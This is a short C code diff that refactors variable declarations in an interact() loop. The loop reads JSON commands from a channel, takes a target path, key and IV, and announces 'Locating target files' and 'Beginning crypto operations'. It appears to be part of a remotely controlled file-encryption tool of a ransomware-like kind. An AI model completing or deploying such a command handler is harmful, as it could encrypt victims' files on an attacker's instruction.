@@ -35,7 +35,9 @@
 void interact(int channel)
 {
     while (1) {
+        char *path, *key, *iv;
         char *input = read_channel(channel);
+
         JSONObject *json = parseJSON(input);
 
         char *cmd = find_json(json, "cmd");
@@ -47,9 +49,10 @@ void interact(int channel)
             JSONObject *json = parseJSON(args);
 
             send_channel(channel, "Locating target files...\n");
-            char *path = find_json(json, "path");
-            char *key = find_json(json, "key");
-            char *iv = find_json(json, "iv");
+            path = find_json(json, "path");
+
+            key = find_json(json, "key");
+            iv = find_json(json, "iv");
 
             send_channel(channel, "Beginning crypto operations...\n");
             freeJSONFromMemory(json);
